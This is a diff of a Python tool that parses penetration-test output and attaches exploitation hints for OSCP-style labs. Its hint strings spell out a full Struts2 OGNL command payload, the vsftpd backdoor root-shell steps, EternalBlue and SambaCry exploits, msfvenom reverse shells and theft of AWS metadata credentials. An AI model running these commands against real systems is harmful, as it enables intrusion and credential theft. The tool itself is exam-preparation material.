+    r'(?im)^[ \t]*\d{1,2}/\d{1,2}/\d{4}\s+\d{1,2}:\d{2}\s+[AP]M\s+'
     r'(?:\d+|<DIR>|\d{1,3}(?:,\d{3})*)?\s+(' + _SMB_LOOT_FILENAMES
     + r')\s*$'
 )
@@ -2680,7 +2688,7 @@ _LDAP_ROOTDSE_HOSTNAME = re.compile(
 #                            vncauth crack utility
 #   Ultra (17) / TLS (18) / VeNCrypt (19) → INFO baseline
 _VNC_PORT_LINE = re.compile(
-    r'(?im)^\s*5900/tcp\s+open\s+vnc'
+    r'(?im)^[ \t]*5900/tcp\s+open\s+vnc'
 )
 # vnc-info NSE block:
 #   | vnc-info:
@@ -2777,7 +2785,7 @@ _SMB_ANON_ACCESS = re.compile(
 #   (C) onesixtyone output row `<host> [<community>] <banner>` →
 #       HIGH with the actual community string surfaced.
 _SNMP_PORT_LINE = re.compile(
-    r'(?im)^\s*161/udp\s+open\s+snmp'
+    r'(?im)^[ \t]*161/udp\s+open\s+snmp'
 )
 _SNMP_SYS_DESCR = re.compile(
     r'(?i)SNMPv2-MIB::sysDescr\.0\s*=\s*STRING:\s*([^\r\n]{5,300})'
@@ -2794,7 +2802,7 @@ _ONESIXTYONE_HIT = re.compile(
 #   (B) `ls -la /var/run/docker.sock` showing the socket exists with
 #       group-writable perms - equivalent primitive.
 _DOCKER_GROUP_ID = re.compile(
-    r'(?im)^\s*uid=\d+\([\w\-.]+\)\s+gid=\d+\([\w\-.]+\)\s+'
+    r'(?im)^[ \t]*uid=\d+\([\w\-.]+\)\s+gid=\d+\([\w\-.]+\)\s+'
     r'groups=[^\r\n]*?\b\d+\(docker\)'
 )
 # iter-222 audit fix: prior `_DOCKER_GROUP_GROUPS` was a dead-code
@@ -2975,7 +2983,7 @@ _CMDKEY_LIST = re.compile(
 )
 # Lazagne typed credential block - title, URL, User, Password
 _LAZAGNE = re.compile(
-    r'(?im)^\s*(?:URL|Login|Username)\s*:\s*(\S{3,80})\s*\n[\s\S]{0,200}?'
+    r'(?im)^[ \t]*(?:URL|Login|Username)\s*:\s*(\S{3,80})\s*\n[\s\S]{0,200}?'
     r'(?:Password|Pwd|Pass)\s*:\s*([^\r\n]{3,80})'
 )
 # pspy / pspy64 timestamped process line:
@@ -3141,7 +3149,7 @@ def _multiline_passes(path, report, store):
     # sibling DCSync records (rare but possible with concatenated dumps).
     _MK_DCSYNC_BLEED = re.compile(r'(?i)Object\s+RDN\s*:')
     _SAM_BLEED = re.compile(r'(?i)\bSamAccountName\s*:')
-    _LAZAGNE_BLEED = re.compile(r'(?im)^\s*(?:URL|Login|Username)\s*:')
+    _LAZAGNE_BLEED = re.compile(r'(?im)^[ \t]*(?:URL|Login|Username)\s*:')
     # iter-168: fresh `Target: Domain:target=` between our capture spans
     # signals a cmdkey /list block with no User: line - the missing block
     # made us pair Target[N] with User[N+1].
@@ -3150,7 +3158,7 @@ def _multiline_passes(path, report, store):
     # a wesng block missing its VulnStatus line - the missing block made us
     # pair Title[N]/CVE[N] with VulnStatus[N+1], falsely marking block N as
     # "Appears Vulnerable".
-    _WESNG_BLEED = re.compile(r'(?im)^\s*Title\s*:')
+    _WESNG_BLEED = re.compile(r'(?im)^[ \t]*Title\s*:')
     # iter-171: same cross-block failure mode in PowerShell transcript
     # blocks (2+ transcripts logged sequentially) and PrivescCheck JSON
     # (vuln objects with no CVE field). Anchors are the block-starting
@@ -3303,36 +3311,64 @@ def _multiline_passes(path, report, store):
     # Doc-file gated. Per-CVE hint routes to concrete exploit tooling.
     if not filters.is_doc_file(path):
         _script_hints = {
+            # iter-311 (D1-02..06): manual, quota-free path FIRST; the
+            # Metasploit module is named only with the one-target-for-
+            # the-whole-exam statement (locked on first use, a failed
+            # run grants no second target, `check` counts).
             "smb-vuln-ms17-010": ("MS17-010 (EternalBlue / EternalRomance)",
-                "PoC: use metasploit ms17_010_eternalblue (ONLY on Windows 7/2008 "
-                "R2 targets; NOT on Windows 10 - use ETERNAL_SYNERGY variant). "
-                "Manual: python2 zzz_exploit.py + AutoBlue-MS17-010 shellcode"),
+                "manual (quota-free, preferred): python2 AutoBlue-MS17-010 "
+                "zzz_exploit.py <ip> or worawit/MS17-010 send_and_execute.py "
+                "<ip> <payload.exe> (Win7/2008R2; Win10 needs the "
+                "ETERNAL_SYNERGY variant)  |  ONLY if you choose THIS box as "
+                "your single Metasploit target for the whole exam (locked on "
+                "first use, failed run = no second target): msfconsole -q -x "
+                "'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS "
+                "<ip>; set LHOST <you>; run'"),
             "smb-vuln-ms08-067": ("MS08-067 netapi RCE",
                 "PoC: searchsploit -m 40279; targets XP/2003 - rare on modern "
                 "labs but comes up in HTB retro boxes"),
             "smb-vuln-cve-2017-7494": ("SambaCry (Samba < 4.6.4)",
-                "PoC: exploit/linux/samba/is_known_pipename in metasploit "
-                "(ONE-target-only quota on exam) OR manual .so upload + "
-                "call_pipename trigger"),
+                "manual (quota-free, preferred): compile a reverse-shell .so, "
+                "upload via smbclient to a writable share, then trigger it "
+                "with the public is_known_pipename python PoC (searchsploit "
+                "samba 4.5 / CVE-2017-7494) - needs the share's local path  |"
+                "  Metasploit exploit/linux/samba/is_known_pipename only if "
+                "this box is your ONE exam-wide MSF target (locked on first "
+                "use)"),
             "smb-vuln-conficker": ("Conficker check (worm hostility, not RCE)",
                 "intel only"),
             "rdp-vuln-ms12-020": ("MS12-020 RDP DoS",
                 "DoS only - not useful for exam; note the target as legacy"),
             "rdp-vuln-cve-2019-0708": ("BlueKeep (CVE-2019-0708)",
-                "PoC: metasploit rdp_cve_2019_0708_bluekeep_rce (unreliable "
-                "on default configs; needs precise hal.dll offsets). ONLY on "
-                "Win 7/2008/XP-Embedded targets"),
+                "intel: BlueKeep RCE is only practical via Metasploit "
+                "(exploit/windows/rdp/cve_2019_0708_bluekeep_rce - fragile, "
+                "needs exact hal.dll offsets, ~50% BSOD). Running it OR its "
+                "`check` locks this box as your ONE exam-wide MSF target - do "
+                "NOT use it as a probe. Prefer another foothold; fingerprint "
+                "passively with nmap --script rdp-ntlm-info,rdp-enum-"
+                "encryption,rdp-vuln-ms12-020 -p3389 <ip> (allowed on all "
+                "targets)"),
             "ssl-heartbleed": ("Heartbleed (CVE-2014-0160)",
                 "PoC: python heartbleed.py <host> 443 or nmap script "
                 "recovery; grep memory dump for session tokens + creds"),
             "ssl-poodle": ("SSLv3 POODLE (CVE-2014-3566)",
                 "protocol downgrade intel; not directly exploitable"),
             "ftp-vsftpd-backdoor": ("vsftpd 2.3.4 backdoor CVE-2011-2523",
-                "PoC: metasploit vsftpd_234_backdoor OR nc <host> 21 with "
-                "smiley user"),
+                "manual (quota-free): nc <host> 21 -> USER x:) / PASS x -> "
+                "then nc <host> 6200 for the root shell (CVE-2011-2523). Do "
+                "NOT spend the one-target Metasploit quota on this"),
             "http-vuln-cve-2017-5638": ("Apache Struts2 (Jakarta)",
-                "PoC: metasploit exploit/multi/http/struts2_content_type_ognl "
-                "(one-target quota); manual: curl -H 'Content-Type: %{...}"),
+                "manual (quota-free, preferred): curl -s -H \"Content-Type: "
+                "%{(#_='multipart/form-data').(#_memberAccess=@ognl."
+                "OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#p=new "
+                "java.lang.ProcessBuilder({'/bin/sh','-c',#cmd})).(#ros="
+                "@org.apache.struts2.ServletActionContext@getResponse()."
+                "getOutputStream()).(@org.apache.commons.io.IOUtils@copy("
+                "#p.start().getInputStream(),#ros)).(#ros.flush())}\" "
+                "http://<host>/<struts-action>  (searchsploit -m 41570 for "
+                "the full PoC)  |  Metasploit exploit/multi/http/"
+                "struts2_content_type_ognl only if this is your ONE exam-wide "
+                "MSF target"),
             # iter-233: modern AD-attack CVEs that show up on OSCP+
             # retired AD labs. Hints call out the compliance trade-off
             # explicitly - Zerologon breaks the DC for other testers,
@@ -3500,7 +3536,7 @@ def _multiline_passes(path, report, store):
                         r'Login\s*:\s*(?!anonymous)\w)',
                         _between)
                     _rejected = re.search(
-                        r'(?im)^\s*530\s+(?:Login\s+incorrect|'
+                        r'(?im)^[ \t]*530\s+(?:Login\s+incorrect|'
                         r'Login\s+authentication\s+failed|'
                         r'Anonymous\s+access\s+denied)',
                         _between)
@@ -3678,7 +3714,9 @@ def _multiline_passes(path, report, store):
             # where the DC printed them in the opposite order.
             _asrep_seen_h = set()
             _spn_seen_h = set()
-            for _um in _LDAP_USER_BLOCK.finditer(text[:65536]):
+            # iter-311 (D4-01): full text - a 50-user LDIF already
+            # exceeds 64 KB; regex is ^dn:-anchored, <=50-line body.
+            for _um in _LDAP_USER_BLOCK.finditer(text):
                 _body = _um.group("body")
                 _sam_m = _LDAP_SAM_LINE.search(_body)
                 if not _sam_m:
@@ -3791,7 +3829,9 @@ def _multiline_passes(path, report, store):
         # a lower-priv db account (still useful for db data extraction
         # and sometimes DB link chaining).
         _sql_ctx_seen = set()
-        for _sm in _MSSQL_SHELL_PROMPT.finditer(text[:65536]):
+        # iter-311 (D4-02): full text - session logs put the prompt
+        # after prior enumeration output.
+        for _sm in _MSSQL_SHELL_PROMPT.finditer(text):
             _sql_user = _sm.group(1).strip()
             _sql_user_low = _sql_user.lower()
             if _sql_user_low in _sql_ctx_seen:
@@ -3847,7 +3887,8 @@ def _multiline_passes(path, report, store):
         # `Creating task \HEXNAME` line is the atexec-specific marker
         # (psexec/wmiexec don't emit it). Fires once per unique task.
         _atexec_seen = set()
-        for _am in _IMPACKET_ATEXEC.finditer(text[:65536]):
+        # iter-311 (D4-03): full text - lateral hops land late in logs.
+        for _am in _IMPACKET_ATEXEC.finditer(text):
             _task = _am.group(1)
             if _task in _atexec_seen:
                 continue
@@ -3872,7 +3913,7 @@ def _multiline_passes(path, report, store):
         # objects). The `[!] Executing shell commands on <target>`
         # marker is dcomexec-specific.
         _dcom_seen = set()
-        for _dm in _IMPACKET_DCOMEXEC.finditer(text[:65536]):
+        for _dm in _IMPACKET_DCOMEXEC.finditer(text):
             # strip trailing dots — the char class `[\w.\-]` was greedy
             # over `...` after the target hostname.
             _tgt = _dm.group(1).strip().rstrip(".")
@@ -3901,7 +3942,8 @@ def _multiline_passes(path, report, store):
         _hive_m = _REG_AUTORUN_HIVE.search(text[:32768])
         if _hive_m:
             _autorun_ct = 0
-            for _em in _REG_AUTORUN_ENTRY.finditer(text[:65536]):
+            # iter-311 (D4-04): full text (hive-marker gated, 5-hit cap).
+            for _em in _REG_AUTORUN_ENTRY.finditer(text):
                 if _autorun_ct >= 5:
                     break
                 _autorun_ct += 1
@@ -3919,10 +3961,33 @@ def _multiline_passes(path, report, store):
                                  f"iter-256 msfvenom exe-gen for the "
                                  f"hijack binary"))
         # Scheduled tasks: block per task; flag SYSTEM tasks.
-        for _tm in _SCHTASKS_QUERY_BLOCK.finditer(text[:65536]):
+        # iter-311 (D4-04): full text - `schtasks /query /fo LIST /v`
+        # emits ~1.5-2 KB per task and a stock host has 150-250 tasks,
+        # so the 64 KB cap saw only the first ~35-40 (the built-in
+        # \Microsoft\Windows tree) and cut the operator-relevant custom
+        # tasks that follow it. Companion noise guard: skip a task whose
+        # binary AND every argument live under the Windows dir (not
+        # writable by a low-priv user - no hijack path; \Windows\Temp
+        # and \Windows\Tasks ARE user-writable and stay), skip the
+        # built-in `COM handler` tasks, and dedupe per Task-To-Run.
+        _sched_seen = set()
+        for _tm in _SCHTASKS_QUERY_BLOCK.finditer(text):
             _task_bin = _tm.group(1).strip()
             _runas = _tm.group(2).strip()
             _runas_lc = _runas.lower()
+            _tb_lc = _task_bin.lower().lstrip('"')
+            if _tb_lc.startswith("com handler"):
+                continue  # built-in COM-activated task; no binary to hijack
+            _tb_paths = re.findall(
+                r'(?:%systemroot%|%windir%|[a-z]:)\\[^\s"]*', _tb_lc)
+            if _tb_paths and all(
+                    re.match(r'(?:%systemroot%|%windir%|[a-z]:\\windows)\\'
+                             r'(?!(?:temp|tasks)\\)', _p)
+                    for _p in _tb_paths):
+                continue  # not user-writable; no hijack path
+            if _tb_lc in _sched_seen:
+                continue
+            _sched_seen.add(_tb_lc)
             _is_priv = ("system" in _runas_lc
                         or "administrator" in _runas_lc
                         or "trustedinstaller" in _runas_lc
@@ -3947,7 +4012,10 @@ def _multiline_passes(path, report, store):
     # section. Doc-file gate applies.
     if not filters.is_doc_file(path):
         _uq_seen = set()
-        for _um in _UNQUOTED_SERVICE.finditer(text[:65536]):
+        # iter-311 (D4-05): full text - `sc qc` loops / winPEAS /
+        # PowerUp output routinely exceed 64 KB and the hijackable
+        # third-party service is listed late.
+        for _um in _UNQUOTED_SERVICE.finditer(text):
             _binpath = _um.group(1).strip()
             if _binpath in _uq_seen:
                 continue
@@ -3967,13 +4035,13 @@ def _multiline_passes(path, report, store):
                              f"msfvenom -p windows/x64/shell_reverse_"
                              f"tcp LHOST=<ATT> LPORT=4444 -f exe -o "
                              f"{os.path.basename(_hijack_stub)} "
-                             f"(counts toward msfvenom quota)  |  "
-                             f"or manual: python2 shellcode-loader.py"
-                             f" + shellcode from msfvenom -f py  |  "
+                             f"(non-meterpreter payload = quota-free "
+                             f"on every target; catch with nc -lvnp "
+                             f"4444)  |  "
                              f"needs WRITE perm on the parent dir - "
                              f"verify with `accesschk64 -uwqs "
                              f"\"Users\" c:\\`"))
-        for _pm in _POWERUP_UNQUOTED.finditer(text[:65536]):
+        for _pm in _POWERUP_UNQUOTED.finditer(text):
             _svc = _pm.group(1).strip()
             _mpath = _pm.group(2).strip()
             report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_pm),
@@ -4093,7 +4161,8 @@ def _multiline_passes(path, report, store):
                        hint=("full chain (IMDSv1):  |  curl "
                              "http://169.254.169.254/latest/meta-data/"
                              "iam/security-credentials/  |  ROLE=$(curl "
-                             "-s .../security-credentials/); curl "
+                             "-s http://169.254.169.254/latest/meta-data/"
+                             "iam/security-credentials/); curl -s "
                              "http://169.254.169.254/latest/meta-data/"
                              "iam/security-credentials/$ROLE > creds."
                              "json  |  IMDSv2 (token-first): TOKEN=$"
@@ -4101,7 +4170,8 @@ def _multiline_passes(path, report, store):
                              "latest/api/token -H 'X-aws-ec2-metadata-"
                              "token-ttl-seconds: 21600'); curl -H "
                              "\"X-aws-ec2-metadata-token: $TOKEN\" "
-                             "http://.../security-credentials/$ROLE  "
+                             "http://169.254.169.254/latest/meta-data/"
+                             "iam/security-credentials/$ROLE  "
                              "|  post-cred: aws sts get-caller-identity"
                              " --profile stolen; then enumerate S3 / "
                              "SSM / Secrets Manager via aws cli with "
@@ -4261,8 +4331,12 @@ def _multiline_passes(path, report, store):
         _smb_ls_seen = set()
         _smb_ls_ct = 0
         _SMB_LOOT_CAP = 10
-        _combined_iter = list(_SMB_CLIENT_LS.finditer(text[:65536])) \
-                         + list(_WIN_DIR_LS.finditer(text[:65536]))
+        # iter-311 (D4-06): full text - recursive share listings /
+        # `dir /s` dumps are the canonical >64 KB loot file and the
+        # SAM backup / .kdbx / id_rsa sits deep in the tree. Output is
+        # already capped at _SMB_LOOT_CAP with filename dedupe.
+        _combined_iter = list(_SMB_CLIENT_LS.finditer(text)) \
+                         + list(_WIN_DIR_LS.finditer(text))
         # Extract host + share from surrounding context.
         _sh_ctx = re.search(
             r'(?i)(?:smbclient|smbmap)[^\r\n]*//([\w.\-]{1,60})/'
@@ -4386,8 +4460,11 @@ def _multiline_passes(path, report, store):
                              "manual reverse shells + impacket  |  "
                              "PowerSploit equivalent: raw C# via "
                              "csc.exe compile  |  CobaltStrike "
-                             "equivalent: msfvenom (one-target "
-                             "quota) OR nc reverse shells"))
+                             "equivalent: msfvenom with a non-"
+                             "meterpreter payload (unlimited on all "
+                             "targets) + nc / multi-handler; a "
+                             "meterpreter payload would bind your ONE "
+                             "MSF target"))
 
     # iter-228: Apache Tomcat web-manager exposure. Emit HIGH RECON
     # when we see EITHER (a) the Tomcat version banner AND some
@@ -4441,14 +4518,14 @@ def _multiline_passes(path, report, store):
                              f"401 && echo FOUND:$c; done  |  post-cred "
                              f"WAR upload chain: msfvenom -p java/jsp_"
                              f"shell_reverse_tcp LHOST=<ATTACKER> "
-                             f"LPORT=4444 -f war -o rev.war  (counts "
-                             f"toward one-target msfvenom quota); "
+                             f"LPORT=4444 -f war -o rev.war  (jsp_shell "
+                             f"= non-meterpreter, quota-free on all "
+                             f"targets; catch with nc -lvnp 4444); "
                              f"curl -u <cred> --upload-file rev.war "
                              f"http://{_thost}:8080/manager/text/deploy"
                              f"?path=/rev; then GET /rev/  |  "
-                             f"exam-legal manual: build WAR by hand "
-                             f"with jar cvf rev.war shell.jsp (no "
-                             f"msfvenom quota cost){_cve_hint}"))
+                             f"alt: build WAR by hand with jar cvf "
+                             f"rev.war shell.jsp{_cve_hint}"))
 
     # iter-229: Jenkins /script Groovy console exposure. Fires on any
     # of:
@@ -4514,8 +4591,10 @@ def _multiline_passes(path, report, store):
     # the dig banner). Doc-file gate applies.
     if not filters.is_doc_file(path):
         _dig_hdr = _DIG_HEADER.search(text[:8192])
-        _a_rows = list(_DNS_A_RECORD_ROW.finditer(text[:65536]))
-        _srv_rows = list(_DNS_SRV_RECORD_ROW.finditer(text[:65536]))
+        # iter-311 (D4-07): full text - an AXFR captured mid-session-log
+        # relies on the >=3-rows fallback; sampling stays at 10 rows.
+        _a_rows = list(_DNS_A_RECORD_ROW.finditer(text))
+        _srv_rows = list(_DNS_SRV_RECORD_ROW.finditer(text))
         _rec_total = len(_a_rows) + len(_srv_rows)
         if (_dig_hdr and _rec_total >= 1) or _rec_total >= 3:
             _hosts_found = {}
@@ -5528,7 +5607,7 @@ def _multiline_passes(path, report, store):
                                 "management-users.properties")
     if _jboss_gate and not filters.is_doc_file(path):
         # Also try to sniff the realm from the file header
-        _realm_m = re.search(r'(?im)^\s*#[^\r\n]*\brealm[^\r\n]*?=\s*(\S+)', text)
+        _realm_m = re.search(r'(?im)^[ \t]*#[^\r\n]*\brealm[^\r\n]*?=\s*(\S+)', text)
         realm = (_realm_m.group(1).strip() if _realm_m else
                  ("ManagementRealm" if "mgmt" in _base_lc or "management" in _base_lc
                   else "ApplicationRealm"))
@@ -5601,7 +5680,7 @@ def _multiline_passes(path, report, store):
                   or "/openldap/" in _plow_pfx
                   or "/slapd.d/" in _plow_pfx
                   or "olcRootPW" in text[:8000]
-                  or re.search(r'(?im)^\s*rootpw\s+\S', text[:8000]))
+                  or re.search(r'(?im)^[ \t]*rootpw\s+\S', text[:8000]))
     if _ldap_gate and not filters.is_doc_file(path):
         _ldap_seen = set()
         for m in _LDAP_ROOTPW.finditer(text):
@@ -6195,19 +6274,32 @@ def _multiline_passes(path, report, store):
                              f"forcers (hydra/ncrack/crowbar/medusa "
                              f"are NOT exam-legal)"))
 
-        # Signal B: rdp-ntlm-info fields - just gate on marker presence
-        # and extract fields anywhere in the text (nmap script output
-        # uses `|   Field: Value` line prefixes which broke a strict
-        # block match).
-        if "rdp-ntlm-info" in text[:65536]:
+        # Signal B: rdp-ntlm-info fields (nmap script output uses
+        # `|   Field: Value` line prefixes which broke a strict block
+        # match, so fields are pulled with free searches).
+        # iter-311 (D4-08): marker-relative loop. The old form gated on
+        # text[:65536] but read the fields from text[:16384] regardless
+        # of where the marker sat, so a multi-host `nmap -sV -sC <cidr>
+        # -oN` file (a) lost markers past 64 KB, (b) read the wrong
+        # region for a marker between 16-64 KB (silent no-op) and
+        # (c) reported at most ONE host. Now every marker gets its own
+        # 2 KB window, cut at the next marker so a `--script
+        # rdp-ntlm-info` command line cannot borrow host 1's fields,
+        # deduped per (domain, host).
+        _rni_seen = set()
+        for _rni in re.finditer(r'(?i)rdp-ntlm-info', text):
+            _rwin = text[_rni.start():_rni.start() + 2048]
+            _rni_next = re.search(r'(?i)rdp-ntlm-info', _rwin[13:])
+            if _rni_next:
+                _rwin = _rwin[:13 + _rni_next.start()]
             _dom = re.search(
                 r'(?i)(?:NetBIOS_Domain_Name|DNS_Domain_Name)\s*:\s*'
-                r'([\w\-.]{1,60})', text[:16384])
+                r'([\w\-.]{1,60})', _rwin)
             _cn = re.search(
                 r'(?i)(?:NetBIOS_Computer_Name|DNS_Computer_Name)\s*'
-                r':\s*([\w\-.]{1,60})', text[:16384])
+                r':\s*([\w\-.]{1,60})', _rwin)
             _pv = re.search(
-                r'(?i)Product_Version\s*:\s*(\d+\.\d+\.\d+)', text[:16384])
+                r'(?i)Product_Version\s*:\s*(\d+\.\d+\.\d+)', _rwin)
             _bits = []
             if _dom:
                 _bits.append(f"DOMAIN={_dom.group(1)}")
@@ -6228,18 +6320,24 @@ def _multiline_passes(path, report, store):
                                      f"rdp-vuln-ms12-020 confirms")
                 except (ValueError, IndexError):
                     pass
-            if _bits:
-                # Anchor to the ntlm-info marker line.
-                _anchor_m = re.search(r'(?i)rdp-ntlm-info', text)
-                report.add("MEDIUM", "RECON", path, _ln(_anchor_m),
-                           f"RDP host intel: {', '.join(_bits)}",
-                           hint=(f"authenticated pivot: xfreerdp "
-                                 f"/u:<domain>\\\\<user> /p:<pw> "
-                                 f"/v:<rdp-host> /d:"
-                                 f"{_dom.group(1) if _dom else '<domain>'}"
-                                 f"  |  fill <rdp-host> with "
-                                 f"{_cn.group(1) if _cn else 'HOST'}"
-                                 f"{_bluekeep}"))
+            if not _bits:
+                continue
+            _rni_sig = ((_dom.group(1) if _dom else "").lower(),
+                        (_cn.group(1) if _cn else "").lower())
+            if _rni_sig in _rni_seen:
+                continue
+            _rni_seen.add(_rni_sig)
+            # _ln(_rni) is full-text-correct: the marker was matched
+            # against `text` itself.
+            report.add("MEDIUM", "RECON", path, _ln(_rni),
+                       f"RDP host intel: {', '.join(_bits)}",
+                       hint=(f"authenticated pivot: xfreerdp "
+                             f"/u:<domain>\\\\<user> /p:<pw> "
+                             f"/v:<rdp-host> /d:"
+                             f"{_dom.group(1) if _dom else '<domain>'}"
+                             f"  |  fill <rdp-host> with "
+                             f"{_cn.group(1) if _cn else 'HOST'}"
+                             f"{_bluekeep}"))
 
     # iter-216: Docker socket exposure = direct root primitive. Emits
     # HIGH when either (a) captured id/groups output shows docker
@@ -6579,7 +6677,7 @@ def _multiline_passes(path, report, store):
     # Evidence so R-KERB chain rules see "operator has ticket ready".
     # Doc-file gated - walkthroughs paste this line verbatim.
     _KRB_TICKET_SAVE = re.compile(
-        r'(?im)^\s*\[\*\]\s*Saving\s+(?:the\s+)?(?:TGT|TGS|ticket)\s+in\s+'
+        r'(?im)^[ \t]*\[\*\]\s*Saving\s+(?:the\s+)?(?:TGT|TGS|ticket)\s+in\s+'
         r'[\'"]?([A-Za-z0-9._@\-\$\+\=]{1,120}\.ccache)[\'"]?\s*$')
     if not filters.is_doc_file(path):
         _kts_seen = set()
@@ -6622,10 +6720,10 @@ def _multiline_passes(path, report, store):
     # until template rotation. If the PFX belongs to Administrator/
     # krbtgt, it's game-over CRITICAL.
     _CERTIPY_PFX_SAVE = re.compile(
-        r'(?im)^\s*\[\*\]\s*(?:Saving|Wrote)\s+certificate(?:\s+and\s+'
+        r'(?im)^[ \t]*\[\*\]\s*(?:Saving|Wrote)\s+certificate(?:\s+and\s+'
         r'private\s+key)?\s+to\s+[\'"]([^\r\n\'"]{1,120}\.pfx)[\'"]?\s*$')
     _CERTIPY_CCACHE_SAVE = re.compile(
-        r'(?im)^\s*\[\*\]\s*(?:Saving|Wrote)\s+credential\s+cache\s+'
+        r'(?im)^[ \t]*\[\*\]\s*(?:Saving|Wrote)\s+credential\s+cache\s+'
         r'to\s+[\'"]([^\r\n\'"]{1,120}\.ccache)[\'"]?\s*$')
     if not filters.is_doc_file(path):
         _pfx_seen = set()
@@ -7103,7 +7201,7 @@ def _multiline_passes(path, report, store):
     # The ConvertTo-SecureString form is already caught by _PS_CONVERT_SECRET
     # (after the line-continuation join above). Catch the bare 'net user' here.
     _NET_USER_PW = re.compile(
-        r'(?im)^\s*net\s+user\s+(\S{1,50})\s+([^\s/][\S]{2,60})(?:\s+/(?:add|domain|active))?\s*$')
+        r'(?im)^[ \t]*net\s+user\s+(\S{1,50})\s+([^\s/][\S]{2,60})(?:\s+/(?:add|domain|active))?\s*$')
     for m in _NET_USER_PW.finditer(text):
         u, pw = m.group(1), m.group(2)
         if filters.is_placeholder(pw) or pw.startswith(("*", "/")):
@@ -7161,7 +7259,9 @@ def _multiline_passes(path, report, store):
         jwt_seen.add(tok)
         report.add("HIGH", "ASSIGNED SECRETS", path, _ln(m),
                    f"HTTP Bearer JWT: {tok[:30]}...",
-                   hint="decode at jwt.io (offline) - check alg=none, weak HS256 secret (hashcat -m 16500), expiry")
+                   # iter-311 (D1-16): never send the operator to a web form
+                   # with a live token; decode locally.
+                   hint="decode OFFLINE: echo '<jwt>' | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo  - check alg=none, exp, roles; weak HS256 secret: hashcat -m 16500 '<jwt>' rockyou.txt  (never paste a live token into a web page)")
 
     # iter-185: Authorization: Bearer <opaque-token> (non-JWT PATs / API keys
     # whose format is well-known - GitHub ghp_/gho_/glpat-, OpenAI sk-,
@@ -7396,7 +7496,7 @@ def _multiline_passes(path, report, store):
     # tagged with 'system=True' so R-DPAPI can pair with any Credentials\ blob
     # even without a per-user masterkey file.
     _LSA_DPAPI_SYSTEM = re.compile(
-        r'(?im)^\s*\[\*\]\s*DPAPI_SYSTEM\s*\r?\n'
+        r'(?im)^[ \t]*\[\*\]\s*DPAPI_SYSTEM\s*\r?\n'
         r'\s*dpapi_machinekey\s*:\s*0x([0-9a-f]{40})\s*\r?\n'
         r'\s*dpapi_userkey\s*:\s*0x([0-9a-f]{40})\s*$')
     for m in _LSA_DPAPI_SYSTEM.finditer(text):
@@ -7426,7 +7526,7 @@ def _multiline_passes(path, report, store):
     #   (c) impacket-getST -impersonate <any-user> -spn CIFS/<host> DOM/HOST$
     #       to hop as any principal to any service on that box.
     _LSA_MACHINE_PLAIN = re.compile(
-        r'(?im)^\s*\[\*\]\s*\$MACHINE\.ACC\s*\r?\n'
+        r'(?im)^[ \t]*\[\*\]\s*\$MACHINE\.ACC\s*\r?\n'
         r'(?:[^\r\n]*\r?\n){0,3}?'
         r'\s*([A-Za-z0-9._\-]{1,60})\\([A-Za-z0-9._\-]{1,40}\$)\s*:\s*'
         r'plain_password_hex\s*:\s*([0-9a-fA-F]{16,4096})\b')
@@ -7451,7 +7551,8 @@ def _multiline_passes(path, report, store):
                          f".decode('utf-16-le').encode())\"  |  silver "
                          f"ticket any user any service: impacket-getST -"
                          f"impersonate Administrator -spn CIFS/<host-fqdn>"
-                         f" '{_hostacct_sh}' -hashes :$MACHINE_ACC_NT  |"
+                         f" '{_hostacct_sh}' -hashes ':<machine-acc-NT-from-"
+                         f"secretsdump $MACHINE.ACC line>'  |"
                          f"  DPAPI SYSTEM unlock: impacket-dpapi masterkey"
                          f" -file <mk> -password <decoded>"))
         if store is not None:
@@ -7470,7 +7571,7 @@ def _multiline_passes(path, report, store):
     # DCSync live against the DC (which is noisier). Also comes up on
     # OSCP+ retired boxes where a DA/backup-op runs it into a share.
     _NTDSUTIL_IFM = re.compile(
-        r'(?im)^\s*IFM\s+media\s+(?:successfully\s+)?created\s+(?:successfully\s+)?'
+        r'(?im)^[ \t]*IFM\s+media\s+(?:successfully\s+)?created\s+(?:successfully\s+)?'
         r'(?:in\s+)?[\'"]?([^\r\n\'"]{2,240}?)[\'"]?\s*$')
     if not filters.is_doc_file(path):
         _ifm_seen = set()
@@ -7741,7 +7842,7 @@ def _multiline_passes(path, report, store):
     # abuse via ExtraSids in a golden ticket. Inbound-only trust is
     # weaker (they trust us, we can't cross into them).
     _NLTEST_TRUST = re.compile(
-        r'(?im)^\s*\d+\s*:\s+([\w.\-]{2,80})\s+[\w\-]{1,40}\s+'
+        r'(?im)^[ \t]*\d+\s*:\s+([\w.\-]{2,80})\s+[\w\-]{1,40}\s+'
         r'\(NT\s*\d+\)[^\r\n]*?'
         r'\((?P<dir>Direct\s+Outbound|Direct\s+Inbound|Bidirectional|'
         r'Primary\s+Domain|Forest\s+Tree\s+Root|Native)\)')
@@ -7947,33 +8048,48 @@ def _multiline_passes(path, report, store):
                     report.add("HIGH", "RECON", path, _ln(_om),
                                f"EOL Windows on {_sam}: {_os_str[:60]}"
                                f" - MS17-010 EternalBlue candidate",
-                               hint=(f"one-target quota: msfconsole -q"
-                                     f" -x 'use exploit/windows/smb/"
-                                     f"ms17_010_eternalblue; set "
-                                     f"RHOSTS {_sam_no}.<dom>; set "
-                                     f"payload windows/x64/meterpreter"
-                                     f"/reverse_tcp; set LHOST <me>; "
-                                     f"run'  |  manual: python2 "
+                               # iter-311 (D1-07): manual quota-free
+                               # exploit FIRST; MSF named only with the
+                               # one-target lock. iter-293: _sam_sh is
+                               # single-quoted (trailing `$` from HOST$).
+                               hint=(f"manual (quota-free, preferred): "
+                                     f"python2 AutoBlue-MS17-010/"
+                                     f"eternalblue_exploit7.py "
+                                     f"{_sam_no}.<dom> sc_x64.bin  "
+                                     f"(confirm first with python2 "
                                      f"AutoBlue-MS17-010/scan_win7_"
-                                     # iter-293 audit fix: wrap _sam_sh
-                                     # in single quotes - it still carries
-                                     # the trailing `$` (from HOST$) which
-                                     # bash would var-expand.
-                                     f"win2k8_win2008r2.py '{_sam_sh}'"))
+                                     f"win2k8_win2008r2.py '{_sam_sh}'; "
+                                     f"build sc_x64.bin from a NON-"
+                                     f"meterpreter msfvenom "
+                                     f"shell_reverse_tcp - unlimited)  |"
+                                     f"  ONLY if {_sam_no} is your ONE "
+                                     f"exam-wide Metasploit target "
+                                     f"(locked on first use): msfconsole"
+                                     f" -q -x 'use exploit/windows/smb/"
+                                     f"ms17_010_eternalblue; set RHOSTS "
